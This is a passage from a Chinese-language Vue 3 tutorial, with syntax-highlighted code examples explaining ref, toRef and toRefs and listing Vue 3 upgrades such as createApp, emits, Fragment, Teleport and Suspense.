        <span class="token keyword">const</span> elemRef <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>

        <span class="token function">onMounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ref template'</span><span class="token punctuation">,</span> elemRef<span class="token punctuation">.</span>value<span class="token punctuation">.</span>innerHTML<span class="token punctuation">,</span> elemRef<span class="token punctuation">.</span>value<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> <span class="token punctuation">{</span>
            elemRef
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="toref和torefs如何使用和最佳方式"><a href="#toref和torefs如何使用和最佳方式" class="header-anchor">#</a> toRef和toRefs如何使用和最佳方式</h3> <p><strong>toRef</strong></p> <ul><li>针对一个响应式对象（<code>reactive</code>封装的）的一个属性，创建一个<code>ref</code>，具有响应式</li> <li>两者保持引用关系</li></ul> <p><strong>toRefs</strong></p> <ul><li>将响应式对象（<code>reactive</code>封装的）转化为普通对象</li> <li>对象的每个属性都是对象的<code>ref</code></li> <li>两者保持引用关系</li></ul> <p>合成函数返回响应式对象</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/99525a723bd206bd.png" loading="lazy" class="lazy"></p> <p><strong>最佳使用方式</strong></p> <ul><li>用<code>reactive</code>做对象的响应式，用<code>ref</code>做值类型响应式（基本类型）</li> <li><code>setup</code>中返回<code>toRefs(state)</code>，或者<code>toRef(state, 'prop')</code></li> <li><code>ref</code>的变量命名都用<code>xxRef</code></li> <li>合成函数返回响应式对象时，使用<code>toRefs</code>，有助于使用方对数据进行解构时，不丢失响应式</li></ul> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>toRef demo - {{ageRef}} - {{state.name}} {{state.age}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">{</span> ref<span class="token punctuation">,</span> toRef<span class="token punctuation">,</span> reactive <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'ToRef'</span><span class="token punctuation">,</span>
    <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'test'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token keyword">const</span> age1 <span class="token operator">=</span> <span class="token function">computed</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token comment">// toRef 如果用于普通对象（非响应式对象），产出的结果不具备响应式</span>
        <span class="token comment">// const state = {</span>
        <span class="token comment">//     age: 20,</span>
        <span class="token comment">//     name: 'test'</span>
        <span class="token comment">// }</span>
        <span class="token comment">// 一个响应式对象state其中一个属性要单独拿出来实现响应式用toRef</span>
        <span class="token keyword">const</span> ageRef <span class="token operator">=</span> <span class="token function">toRef</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">)</span>

        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            state<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">25</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1500</span><span class="token punctuation">)</span>

        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            ageRef<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">30</span> <span class="token comment">// .value 修改值</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> <span class="token punctuation">{</span>
            state<span class="token punctuation">,</span>
            ageRef
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>toRefs demo {{age}} {{name}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">{</span> ref<span class="token punctuation">,</span> toRef<span class="token punctuation">,</span> toRefs<span class="token punctuation">,</span> reactive <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'ToRefs'</span><span class="token punctuation">,</span>
    <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'test'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token keyword">const</span> stateAsRefs <span class="token operator">=</span> <span class="token function">toRefs</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token comment">// 将响应式对象，变成普通对象</span>

        <span class="token comment">// const { age: ageRef, name: nameRef } = stateAsRefs // 每个属性，都是 ref 对象</span>
        <span class="token comment">// return {</span>
        <span class="token comment">//     ageRef,</span>
        <span class="token comment">//     nameRef</span>
        <span class="token comment">// }</span>

        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            state<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">25</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1500</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> stateAsRefs
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="深入理解为什么需要ref、toref、torefs"><a href="#深入理解为什么需要ref、toref、torefs" class="header-anchor">#</a> 深入理解为什么需要ref、toRef、toRefs</h3> <p><strong>为什么需要用 ref</strong></p> <ul><li>返回值类型，会丢失响应式</li> <li>如在<code>setup</code>、<code>computed</code>、合成函数，都有可能返回值类型</li> <li><code>Vue</code>如不定义<code>ref</code>，用户将制造<code>ref</code>，反而更混乱</li></ul> <p><strong>为何ref需要.value属性</strong></p> <ul><li><code>ref</code>是一个对象（不丢失响应式），<code>value</code>存储值</li> <li>通过<code>.value</code>属性的<code>get</code>和<code>set</code>实现响应式</li> <li>用于模板、<code>reactive</code>时，不需要<code>.value</code>，其他情况都要</li></ul> <p><strong>为什么需要toRef和toRefs</strong></p> <ul><li><strong>初衷</strong>：不丢失响应式的情况下，把对象数据 <code>分解/扩散</code></li> <li><strong>前端</strong>：针对的是响应式对象（<code>reactive</code>封装的）非普通对象</li> <li>注意：<strong>不创造</strong>响应式，而是<strong>延续</strong>响应式</li></ul> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>why ref demo {{state.age}} - {{age1}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">{</span> ref<span class="token punctuation">,</span> toRef<span class="token punctuation">,</span> toRefs<span class="token punctuation">,</span> reactive<span class="token punctuation">,</span> computed <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>

<span class="token keyword">function</span> <span class="token function">useFeatureX</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">2</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token function">toRefs</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'WhyRef'</span><span class="token punctuation">,</span>
    <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 解构不丢失响应式</span>
        <span class="token keyword">const</span> <span class="token punctuation">{</span> x<span class="token punctuation">,</span> y <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useFeatureX</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'test'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token comment">// computed 返回的是一个类似于 ref 的对象，也有 .value</span>
        <span class="token keyword">const</span> age1 <span class="token operator">=</span> <span class="token function">computed</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> state<span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            state<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">25</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1500</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> <span class="token punctuation">{</span>
            state<span class="token punctuation">,</span>
            age1<span class="token punctuation">,</span>
            x<span class="token punctuation">,</span>
            y
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="vue3升级了哪些重要功能"><a href="#vue3升级了哪些重要功能" class="header-anchor">#</a> vue3升级了哪些重要功能</h3> <p><strong>1. createApp</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// vue2</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token comment">/**选项**/</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token comment">/****/</span><span class="token punctuation">)</span>
Vue<span class="token punctuation">.</span><span class="token function">mixin</span><span class="token punctuation">(</span><span class="token comment">/****/</span><span class="token punctuation">)</span>
Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token comment">/****/</span><span class="token punctuation">)</span>
Vue<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token comment">/****/</span><span class="token punctuation">)</span>

<span class="token comment">// vue3</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">createApp</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token comment">/**选项**/</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token comment">/****/</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">mixin</span><span class="token punctuation">(</span><span class="token comment">/****/</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token comment">/****/</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token comment">/****/</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>2. emits属性</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 父组件</span>
<span class="token operator">&lt;</span>Hello <span class="token operator">:</span>msg<span class="token operator">=</span><span class="token string">&quot;msg&quot;</span> @onSayHello<span class="token operator">=</span><span class="token string">&quot;sayHello&quot;</span><span class="token operator">&gt;</span>

<span class="token comment">// 子组件</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Hello'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">msg</span><span class="token operator">:</span> String
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">emits</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'onSayHello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 声明emits</span>
    <span class="token function">setup</span><span class="token punctuation">(</span><span class="token parameter">props<span class="token punctuation">,</span> <span class="token punctuation">{</span>emit<span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'onSayHello'</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>3. 多事件</strong></p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- 定义多个事件 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>one($event),two($event)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>提交<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>4. Fragment</strong></p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- vue2 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>{{title}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- vue3：不在使用div节点包裹 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>{{title}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>5. 移除.sync</strong></p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- vue2 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MyComponent</span> <span class="token attr-name">:title.sync</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>title<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>

<span class="token comment">&lt;!-- vue3 简写 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MyComponent</span> <span class="token attr-name"><span class="token namespace">v-model:</span>title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>title<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token comment">&lt;!-- 非简写 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MyComponent</span> <span class="token attr-name">:title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>title<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">@update:</span>title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>title = $event<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre></div><p><strong>.sync用法</strong></p> <p>父组件把属性给子组件，子组件修改了后还能同步到父组件中来</p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>close<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>关闭<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">isVisible</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">type</span><span class="token operator">:</span> Boolean<span class="token punctuation">,</span>
            <span class="token keyword">default</span><span class="token operator">:</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token function">close</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'update:isVisible'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- 父组件使用 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>chlid-component</span> <span class="token attr-name">:isVisible.sync</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>isVisible<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>chlid-component</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text-doc</span> <span class="token attr-name">:title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>doc.title<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">@update:</span>title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>doc.title = $event<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text-doc</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- 为了方便期间，为这种模式提供一个简写 .sync --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text-doc</span> <span class="token attr-name">:title.sync</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>doc.title<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre></div><p><strong>6. 异步组件的写法</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// vue2写法</span>
<span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token literal-property property">components</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">'my-component'</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./my-component.vue'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// vue3写法</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>createApp<span class="token punctuation">,</span> defineAsyncComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">components</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">AsyncComponent</span><span class="token operator">:</span> <span class="token function">defineAsyncComponent</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./AsyncComponent.vue'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>7. 移除filter</strong></p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- 以下filter在vue3中不可用了 --&gt;</span>

<span class="token comment">&lt;!-- 在花括号中 --&gt;</span>
{{message | capitalize}}

<span class="token comment">&lt;!-- 在v-bind中 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">v-bind:</span>id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>rawId | formatId<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>8. Teleport</strong></p> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>modalOpen = true<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
 open
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- 通过teleport把弹窗放到body下 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>teleport</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>body<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>modalOpen<span class="token punctuation">&quot;</span></span> <span class="token attr-name">classs</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>modal<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
     teleport弹窗，父元素是body
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>modalOpen = false<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>close<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>teleport</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>9. Suspense</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Suspense</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token comment">&lt;!-- 异步组件 --&gt;</span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Test1</span> <span class="token punctuation">/&gt;</span></span>  
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
 <span class="token comment">&lt;!-- fallback是一个具名插槽，即Suspense内部有两个slot，一个具名插槽fallback --&gt;</span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">#fallback</span><span class="token punctuation">&gt;</span></span>
    loading...
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Suspense</span><span class="token punctuation">&gt;</span></span>
